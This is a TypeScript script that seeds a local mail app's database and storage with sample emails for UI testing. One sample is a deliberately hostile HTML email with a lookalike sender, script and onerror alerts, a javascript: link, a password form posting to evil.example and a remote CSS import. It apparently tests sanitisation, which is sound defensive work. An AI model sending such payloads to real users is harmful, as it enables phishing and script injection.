// Seed the LOCAL D1 and R2 with sample mail so the UI can be exercised before the inbound pipeline
// exists. Refuses to touch Cloudflare. Run: pnpm seed:local
import { ulid } from "../src/shared/ulid.ts";
import { executeSql, putObject, sql } from "./lib.ts";

if (process.argv.includes("--remote")) {
  process.stderr.write("seed-local only writes to the local database.\n");
  process.exit(1);
}

const HOUR = 3_600_000;
const now = Date.now();

interface Sample {
  threadKey: string;
  folder: "inbox" | "sent" | "archive" | "spam";
  direction: "in" | "out";
  from: { address: string; name?: string };
  to: Array<{ address: string; name?: string }>;
  subject: string;
  text: string;
  html?: string;
  hoursAgo: number;
  isRead?: boolean;
  isStarred?: boolean;
  attachment?: { filename: string; contentType: string; body: string };
  labels?: string[];
  inReplyToKey?: string;
}

const owner = { address: "noman@quadgentics.com", name: "Muhammad Noman" };
const samples: Array<Sample & { key: string }> = [
  {
    key: "q1",
    threadKey: "proposal",
    folder: "inbox",
    direction: "in",
    from: { address: "sara@clientco.example", name: "Sara Khan" },
    to: [owner],
    subject: "Website redesign proposal",
    text: "Hi Noman,\n\nCould you send the redesign proposal and a rough timeline by Friday?\n\nThanks,\nSara",
    hoursAgo: 50,
    isRead: true,
    labels: ["Clients"],
  },
  {
    key: "q2",
    threadKey: "proposal",
    folder: "sent",
    direction: "out",
    from: owner,
    to: [{ address: "sara@clientco.example", name: "Sara Khan" }],
    subject: "Re: Website redesign proposal",
    text: "Hi Sara,\n\nAttached is the proposal. Timeline: 3 weeks from kickoff.\n\nBest,\nNoman",
    hoursAgo: 30,
    isRead: true,
    attachment: { filename: "proposal.txt", contentType: "text/plain", body: "Proposal v1: discovery, design, build." },
    inReplyToKey: "q1",
    labels: ["Clients"],
  },
  {
    key: "q3",
    threadKey: "proposal",
    folder: "inbox",
    direction: "in",
    from: { address: "sara@clientco.example", name: "Sara Khan" },
    to: [owner],
    subject: "Re: Website redesign proposal",
    text: "Looks great. Let's start Monday. Invoice details to follow.",
    html: "<p>Looks <b>great</b>. Let's start Monday.</p><p>Invoice details to follow.</p>",
    hoursAgo: 3,
    isStarred: true,
    inReplyToKey: "q2",
    labels: ["Clients"],
  },
  {
    key: "n1",
    threadKey: "newsletter",
    folder: "inbox",
    direction: "in",
    from: { address: "news@cloud.example", name: "Cloud Weekly" },
    to: [owner],
    subject: "This week in serverless",
    text: "Edge databases, durable timers and more. Read online: https://cloud.example/weekly",
    html: '<h2>This week in serverless</h2><p>Edge databases, durable timers and more.</p><img src="https://tracker.cloud.example/open.gif?u=42" width="1" height="1" alt=""><p><a href="https://cloud.example/weekly">Read online</a></p>',
    hoursAgo: 8,
  },
  {
    key: "h1",
    threadKey: "hostile",
    folder: "inbox",
    direction: "in",
    from: { address: "security@paypa1.example", name: "Account Team" },
    to: [owner],
    subject: "Verify your account (hostile HTML test)",
    text: "Your account is locked.",
    html: '<p>Your account is locked.</p><script>alert(1)</script><img src=x onerror="alert(2)"><form action="https://evil.example"><input name="password" placeholder="Password"><button>Unlock</button></form><a href="javascript:alert(3)">Click here</a><style>@import url(https://evil.example/x.css);</style>',
    hoursAgo: 20,
  },
  {
    key: "a1",
    threadKey: "receipt",
    folder: "archive",
    direction: "in",
    from: { address: "billing@hosting.example", name: "Hosting Billing" },
    to: [owner],
    subject: "Your invoice INV-2026-118",
    text: "Thanks for your payment of $5.00. Invoice INV-2026-118 is attached.",
    hoursAgo: 24 * 12,
    isRead: true,
    attachment: { filename: "INV-2026-118.txt", contentType: "text/plain", body: "Invoice INV-2026-118: $5.00 paid." },
    labels: ["Receipts"],
  },
  {
    key: "s1",
    threadKey: "spam",
    folder: "spam",
    direction: "in",
    from: { address: "winner@lottery.example" },
    to: [owner],
    subject: "You have won 1,000,000 dollars",
    text: "Claim now!!!",
    hoursAgo: 5,
  },
];

function header(addresses: Array<{ address: string; name?: string }>): string {
  return addresses.map((a) => (a.name ? `"${a.name}" <${a.address}>` : `<${a.address}>`)).join(", ");
}

function eml(sample: Sample, messageId: string, inReplyTo: string | null, date: Date): string {
  const boundary = `qm-${messageId.slice(1, 9)}`;
  const lines = [
    `From: ${header([sample.from])}`,
    `To: ${header(sample.to)}`,
    `Subject: ${sample.subject}`,
    `Date: ${date.toUTCString()}`,
    `Message-ID: ${messageId}`,
    ...(inReplyTo ? [`In-Reply-To: ${inReplyTo}`, `References: ${inReplyTo}`] : []),
    "MIME-Version: 1.0",
    `Content-Type: multipart/mixed; boundary="${boundary}"`,
    "",
    `--${boundary}`,
    `Content-Type: multipart/alternative; boundary="${boundary}-alt"`,
    "",
    `--${boundary}-alt`,
    "Content-Type: text/plain; charset=utf-8",
    "",
    sample.text,
    ...(sample.html ? [`--${boundary}-alt`, "Content-Type: text/html; charset=utf-8", "", sample.html] : []),
    `--${boundary}-alt--`,
    ...(sample.attachment
      ? [
          `--${boundary}`,
          `Content-Type: ${sample.attachment.contentType}; name="${sample.attachment.filename}"`,
          `Content-Disposition: attachment; filename="${sample.attachment.filename}"`,
          "Content-Transfer-Encoding: base64",
          "",
          Buffer.from(sample.attachment.body).toString("base64"),
        ]
      : []),
    `--${boundary}--`,
    "",
  ];
  return lines.join("\r\n");
}

const labelIds = new Map<string, string>([
  ["Clients", ulid()],
  ["Receipts", ulid()],
]);
const labelColors: Record<string, string> = { Clients: "#2563eb", Receipts: "#16a34a" };
const threadIds = new Map<string, string>();
const messageIds = new Map<string, string>();
const headerIds = new Map<string, string>();
const statements: string[] = [];

for (const [name, id] of labelIds) statements.push(`INSERT OR IGNORE INTO labels (id, user_id, name, color) VALUES (${sql(id)}, (SELECT id FROM users WHERE role = 'admin' ORDER BY created_at LIMIT 1), ${sql(name)}, ${sql(labelColors[name]!)});`);

for (const sample of samples) {
  const receivedAt = now - sample.hoursAgo * HOUR;
  const id = ulid(receivedAt);
  messageIds.set(sample.key, id);
  const hdr = `<${id.toLowerCase()}@seed.quadmail>`;
  headerIds.set(sample.key, hdr);
  const inReplyTo = sample.inReplyToKey ? (headerIds.get(sample.inReplyToKey) ?? null) : null;

  let threadId = threadIds.get(sample.threadKey);
  if (!threadId) {
    threadId = ulid(receivedAt);
    threadIds.set(sample.threadKey, threadId);
    const subjectNorm = sample.subject.replace(/^(re|fwd?):\s*/i, "").toLowerCase();
    statements.push(`INSERT INTO threads (id, subject_norm, last_message_at, message_count) VALUES (${sql(threadId)}, ${sql(subjectNorm)}, ${receivedAt}, 0);`);
  }
  statements.push(`UPDATE threads SET last_message_at = MAX(last_message_at, ${receivedAt}), message_count = message_count + 1 WHERE id = ${sql(threadId)};`);

  const date = new Date(receivedAt);
  const rawKey = `raw/${date.getUTCFullYear()}/${String(date.getUTCMonth() + 1).padStart(2, "0")}/${id}.eml`;
  const raw = eml(sample, hdr, inReplyTo, date);
  putObject(rawKey, raw, "--local");

  const snippet = sample.text.replace(/\s+/g, " ").trim().slice(0, 200);
  statements.push(
    `INSERT INTO messages (id, thread_id, direction, folder, message_id_hdr, in_reply_to, references_json, envelope_from, envelope_to, from_addr, from_name, to_json, cc_json, subject, snippet, search_text, raw_key, size_bytes, has_attachments, is_read, is_starred, parse_status, received_at, sent_at, user_id) VALUES (` +
      [
        sql(id),
        sql(threadId),
        sql(sample.direction),
        sql(sample.folder),
        sql(hdr),
        sql(inReplyTo),
        sql(JSON.stringify(inReplyTo ? [inReplyTo] : [])),
        sql(sample.from.address),
        sql(sample.to[0]!.address),
        sql(sample.from.address),
        sql(sample.from.name ?? null),
        sql(JSON.stringify(sample.to)),
        sql("[]"),
        sql(sample.subject),
        sql(snippet),
        sql(sample.text),
        sql(rawKey),
        Buffer.byteLength(raw),
        sample.attachment ? 1 : 0,
        sample.isRead ? 1 : 0,
        sample.isStarred ? 1 : 0,
        sql("done"),
        receivedAt,
        sql(sample.direction === "out" ? receivedAt : null),
        // Seed mail belongs to the admin (run `pnpm owner:password` first).
        "(SELECT id FROM users WHERE role = 'admin' ORDER BY created_at LIMIT 1)",
      ].join(", ") +
      ");",
  );
  if (sample.attachment) {
    const attId = ulid(receivedAt);
    const attKey = `att/${id}/${attId}`;
    putObject(attKey, sample.attachment.body, "--local");
    statements.push(
      `INSERT INTO attachments (id, message_id, filename, content_type, size_bytes, r2_key, content_id, is_inline) VALUES (${sql(attId)}, ${sql(id)}, ${sql(sample.attachment.filename)}, ${sql(sample.attachment.contentType)}, ${Buffer.byteLength(sample.attachment.body)}, ${sql(attKey)}, NULL, 0);`,
    );
  }
  for (const label of sample.labels ?? []) statements.push(`INSERT OR IGNORE INTO message_labels (message_id, label_id) SELECT ${sql(id)}, id FROM labels WHERE name = ${sql(label)};`);
}

executeSql(statements, "--local");
process.stdout.write(`Seeded ${samples.length} messages in ${threadIds.size} threads with ${labelIds.size} labels (local only).\n`);
